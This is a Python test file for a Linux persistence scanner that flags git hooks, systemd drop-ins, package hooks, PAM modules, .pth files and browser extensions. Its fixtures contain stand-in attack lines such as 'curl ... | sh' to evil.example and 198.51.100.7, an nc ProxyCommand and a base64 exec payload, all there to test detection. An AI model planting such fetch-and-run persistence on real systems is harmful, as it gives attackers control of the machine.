# Run: python3 tests/test_persistence.py (or pytest)
import atexit, os, shutil, sys, tempfile
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from arche.persistence import hooks, chromium_roots, chromium_extensions, install_cmds, git_runs, dns_rows, pam_rows, lib_dir_rows, user_writable


def test_hooks():
    home, old = tempfile.mkdtemp(), dict(os.environ); atexit.register(shutil.rmtree, home, True)
    os.environ.update(HOME=home, GIT_CONFIG_NOSYSTEM='1')
    try:
        with open(f'{home}/.gitconfig', 'w') as f:
            f.write('[core]\n\tfsmonitor = "curl evil.sh | sh"\n[alias]\n\tlg = log --oneline\n\tx = !rm -rf /tmp/x\n[init]\n\ttemplateDir = ~/.tpl\n')
        os.makedirs(f'{home}/.tpl/hooks'); open(f'{home}/.tpl/hooks/post-checkout', 'w').write('#!/bin/sh\ncurl -s http://198.51.100.7/a | sh\n')
        os.chmod(f'{home}/.tpl/hooks/post-checkout', 0o755); open(f'{home}/.tpl/hooks/pre-push.sample', 'w').write('')
        open(f'{home}/.gdbinit', 'w').write('set auto-load safe-path /\n')
        os.makedirs(f'{home}/.ssh'); open(f'{home}/.ssh/config', 'w').write('Host *\n  ProxyCommand nc -x evil:1080 %h %p\n  User me\n')
        apps = f'{home}/.local/share/applications'; os.makedirs(apps); os.makedirs(f'{home}/.config')
        open(f'{home}/.config/mimeapps.list', 'w').write('[Default Applications]\nx-scheme-handler/https=evil.desktop\n')
        open(f'{apps}/evil.desktop', 'w').write('[Desktop Entry]\nExec=/tmp/b %u\nMimeType=text/html;x-scheme-handler/https;x-scheme-handler/zz;\n')
        sp = f'{home}/proj/.venv/lib/python3.12/site-packages'; os.makedirs(sp)
        open(f'{sp}/evil.pth', 'w').write("import base64;exec(base64.b64decode('cHJpbnQoMSk='))\n")
        open(f'{sp}/_virtualenv.pth', 'w').write('import _virtualenv\n'); open(f'{sp}/paths.pth', 'w').write('/opt/x\n')
        full = list(hooks())
        rows = [r[0] for r in full if home in r[0] or r[0].startswith(('git global', 'Web links', 'https://')) or '.tpl' in r[0]]
    finally: os.environ.clear(); os.environ.update(old)
    pth = [(t, sev) for t, sev, _ in full if '.pth' in t]
    assert len(pth) == 1 and pth[0][1] == 2 and 'evil.pth runs code at every start' in pth[0][0] and '(base64)' in pth[0][0], pth
    assert any('core.fsmonitor' in r for r in rows) and any('alias.x' in r for r in rows), rows
    assert not any('alias.lg' in r or 'User me' in r for r in rows) and any('ProxyCommand nc' in r for r in rows), rows
    tpl = [r.replace(home, '~') for r in rows if '.tpl' in r]
    assert [r.replace(home, '~') for r in rows if 'gdb' in r][0] == 'Runs each time gdb starts: ~/.gdbinit' and any('lets gdb run' in r for r in rows), rows
    assert 'Web links open with evil.desktop: /tmp/b %u' in rows and 'https://, zz:// links start evil.desktop (a web page can open them): /tmp/b %u' in rows, rows
    assert tpl[0] == 'Every repo you clone or create gets this git hook: ~/.tpl/hooks/post-checkout' and 'piped into a shell' in tpl[1] and len(tpl) == 2, tpl



def test_custom_chromium_dirs():
    home, old = tempfile.mkdtemp(), dict(os.environ); atexit.register(shutil.rmtree, home, True)
    for d in ('.config/brave-vault/Default', '.config/Code', '.var/app/x.y/config/work/Profile 2'): os.makedirs(f'{home}/{d}')
    for f in ('.config/brave-vault/Local State', '.config/brave-vault/Default/Preferences', '.config/Code/Local State',
              '.config/Code/Preferences', '.var/app/x.y/config/work/Local State', '.var/app/x.y/config/work/Profile 2/Preferences'):
        open(f'{home}/{f}', 'w').write('{}')
    os.environ['HOME'] = home
    try: extra = [(n, r.replace(home, '~')) for n, r in chromium_roots() if r.startswith(home)]
    finally: os.environ.clear(); os.environ.update(old)
    assert extra == [('brave-vault', '~/.config/brave-vault'), ('work', '~/.var/app/x.y/config/work')], extra   # not the Electron app



def test_unpacked_extensions():
    import json
    home, old = tempfile.mkdtemp(), dict(os.environ); atexit.register(shutil.rmtree, home, True)
    prof, dev = f'{home}/.config/google-chrome/Default', f'{home}/.cache/.x'
    for d in (f'{prof}/Extensions/aaaa/1.0', dev): os.makedirs(d)
    open(f'{home}/.config/google-chrome/Local State', 'w').write('{}'); open(f'{prof}/Preferences', 'w').write('{}')
    open(f'{prof}/Extensions/aaaa/1.0/manifest.json', 'w').write('{"name": "Store one"}')
    open(f'{dev}/manifest.json', 'w').write('{"name": "Helper", "host_permissions": ["<all_urls>"]}')
    open(f'{prof}/Secure Preferences', 'w').write(json.dumps({'extensions': {'settings': {
        'bbbb': {'location': 4, 'path': dev}, 'cccc': {'location': 1, 'path': dev}, 'dddd': {'location': 8, 'path': f'{home}/gone'}}}}))
    import arche.persistence as p
    os.environ['HOME'], real = home, p.HOME; p.HOME = home
    try: got = sorted((t, e) for n, t, e, _ in chromium_extensions() if n == 'Chrome')
    finally: os.environ.clear(); os.environ.update(old); p.HOME = real
    assert got == [('Helper', 'bbbb'), ('Store one', 'aaaa')], got


def test_dropins():
    import arche.persistence as p
    home, old, real = tempfile.mkdtemp(), dict(os.environ), p.sh; atexit.register(shutil.rmtree, home, True)
    for d in ('pipewire.service.d', 'service.d', 'app.slice.d'): os.makedirs(f'{home}/.config/systemd/user/{d}')
    open(f'{home}/.config/systemd/user/pipewire.service.d/o.conf', 'w').write('[Service]\nExecStart=\nExecStartPre=/home/x/.cache/run\n')
    open(f'{home}/.config/systemd/user/service.d/z.conf', 'w').write('[Service]\nExecStartPost=curl -s evil.example | sh\n')
    open(f'{home}/.config/systemd/user/app.slice.d/50-mem.conf', 'w').write('[Slice]\nMemoryHigh=2G\n')
    os.environ['HOME'], p.sh = home, lambda *a, **k: ''
    try: rows = [r[0].replace(home, '~') for r in p.services()]
    finally: os.environ.clear(); os.environ.update(old); p.sh = real
    assert rows == ['~/.config/systemd/user/pipewire.service.d/o.conf adds to pipewire.service: ExecStartPre=/home/x/.cache/run',
                    '~/.config/systemd/user/service.d/z.conf adds to every service: ExecStartPost=curl -s evil.example | sh'], rows


def test_root_groups():
    import arche.persistence as p
    real = p.sh
    p.sh = lambda *a, **k: {'docker': 'docker:x:970:finn\n', 'disk': 'disk:x:6:\n', 'wheel': 'wheel:x:10:finn,amy\n'}.get(a[-1], '') if a[:2] == ('getent', 'group') else ''
    try: rows = [(t, s) for t, s, _ in p.remote() if 'group' in t or 'Admin' in t]
    finally: p.sh = real
    assert rows == [('Admin (wheel): finn', 0), ('Admin (wheel): amy', 0),
                    ('finn is in the docker group: any program finn runs can make itself root, with no password', 1)], rows


def test_install_cmds():
    t = ('install usb-storage /bin/true\ninstall cramfs /bin/false\ninstall dccp exit 1\n# install x /tmp/evil\n'
         'install snd-pcm /sbin/modprobe --ignore-install snd-pcm && /sbin/modprobe snd-seq\n'
         'install e1000e /tmp/.x/run.sh; /sbin/modprobe --ignore-install e1000e\nblacklist nouveau\n')
    assert list(install_cmds(t)) == [('e1000e', '/tmp/.x/run.sh; /sbin/modprobe --ignore-install e1000e')], list(install_cmds(t))


def test_git_runs():
    l = ('core.fsmonitor=true\ncore.fsmonitor=.git/hooks/fsmonitor-watchman\nfilter.lfs.smudge=git-lfs smudge -- %f\n'
         'filter.x.smudge=./x.sh\ndiff.pdf.textconv=pdftotext\nalias.st=status\nalias.y=!sh y\nremote.origin.url=https://x\n')
    assert [k for k, _ in git_runs(l)] == ['core.fsmonitor', 'filter.x.smudge', 'diff.pdf.textconv', 'alias.y']


def test_repo_git_folder():
    import arche.ai
    r, old = tempfile.mkdtemp(), arche.ai.repos; atexit.register(shutil.rmtree, r, True)
    os.makedirs(f'{r}/.git/hooks')
    open(f'{r}/.git/config', 'w').write('[core]\n\tfsmonitor = "curl -s https://evil.example/x | sh"\n\tsshCommand = ssh -i ~/.ssh/deploy\n')
    open(f'{r}/.git/hooks/post-checkout', 'w').write('#!/bin/sh\necho hi\n'); os.chmod(f'{r}/.git/hooks/post-checkout', 0o755)
    open(f'{r}/.git/hooks/pre-commit.sample', 'w').write('#!/bin/sh\n'); os.chmod(f'{r}/.git/hooks/pre-commit.sample', 0o755)
    arche.ai.repos = lambda: [r]
    try: rows = [(t, s) for t, s, _ in hooks() if r in t]
    finally: arche.ai.repos = old
    assert [s for _, s in rows] == [1, 0, 0] and 'evil.example' in rows[0][0] and 'post-checkout' in rows[2][0], rows


def test_dns_rows():
    g = 'Global\n         Protocols: LLMNR=resolve -mDNS {} DNSSEC=no\n  resolv.conf mode: {}\n\nLink 2 (eno1)\n    Protocols: +DefaultRoute -mDNS\n                    {}\n'
    t = lambda *a: [r[0].split(':')[0] for r in dns_rows(g.format(*a))]
    assert t('-DNSOverTLS', 'foreign', '-DNSOverTLS') == ['DNS lookups skip systemd-resolved (/etc/resolv.conf names the servers itself), so they go out unencrypted']
    assert t('-DNSOverTLS', 'stub', '-DNSOverTLS') == ['DNS lookups go out unencrypted']
    assert t('-DNSOverTLS', 'stub', 'DNSOverTLS=opportunistic') == ['DNS over TLS']
    assert t('+DNSOverTLS', 'stub', '-DNSOverTLS') == ['DNS over TLS'] and list(dns_rows('')) == []


def test_package_hooks():
    import arche.persistence as p
    d = tempfile.mkdtemp(); atexit.register(shutil.rmtree, d, True)
    open(f'{d}/x.actions', 'w').write('# note\npost_transaction:::enabled=1:/usr/bin/sh -c "curl -s http://198.51.100.7/i | sh"\n')
    open(f'{d}/99x', 'w').write('APT::Update::Pre-Invoke {"/opt/u/run";};\nAPT::Periodic::Enable "1";\n')
    open(f'{d}/own.actions', 'w').write('pre_transaction::::/usr/libexec/guard\n')
    real = p.PM_HOOKS, p.owned, p.have
    p.PM_HOOKS, p.owned, p.have = (f'{d}/*.actions', f'{d}/99x'), lambda fs: {f for f in fs if 'own.' in f}, lambda c: False
    try: rows = [(t.replace(d, '~'), s) for t, s, _ in p.hooks() if d in t]
    finally: p.PM_HOOKS, p.owned, p.have = real
    assert rows[0] == ('Runs as root at every package install or update: ~/99x: APT::Update::Pre-Invoke {"/opt/u/run";};', 0), rows
    assert rows[1][0].startswith('Runs as root at every package install or update: ~/x.actions: post_transaction') and rows[2][1] == 1 and len(rows) == 3, rows


def test_pam_and_lib_dirs():
    conf = 'auth sufficient pam_unix.so\n#auth required pam_ghost.so\nauth optional /opt/x/pam_evil.so\n'
    rows = list(pam_rows({'/usr/lib64/security/pam_unix.so', '/opt/x/pam_evil.so', '/usr/lib64/security/pam_ghost.so'}, conf, {'/usr/lib64/security/pam_unix.so'}))
    assert [(r[0].split(' came')[0], r[1]) for r in rows] == [('PAM module /opt/x/pam_evil.so', 2), ('PAM module /usr/lib64/security/pam_ghost.so', 1)], rows
    d = tempfile.mkdtemp(); atexit.register(shutil.rmtree, d, True)
    assert user_writable(d) and user_writable(f'{d}/not/yet') and not user_writable('/usr/lib64/nothing-here')
    rows = list(lib_dir_rows({'/etc/ld.so.conf.d/a.conf': f'# x\n{d}/lib\n/usr/lib64/x\n', '/etc/ld.so.conf.d/b.conf': '/usr/lib64/ffmpeg\n',
                              '/etc/ld.so.conf': 'include ld.so.conf.d/*.conf\n'}))
    assert [r[1] for r in rows] == [2, 0] and f'{d}/lib' in rows[0][0] and '/usr/lib64/x' not in rows[0][0], rows


if __name__ == '__main__':
    test_pam_and_lib_dirs(); test_package_hooks(); test_hooks(); test_dns_rows(); test_git_runs(); test_repo_git_folder(); test_custom_chromium_dirs(); test_unpacked_extensions(); test_dropins(); test_root_groups(); test_install_cmds(); print('ok')
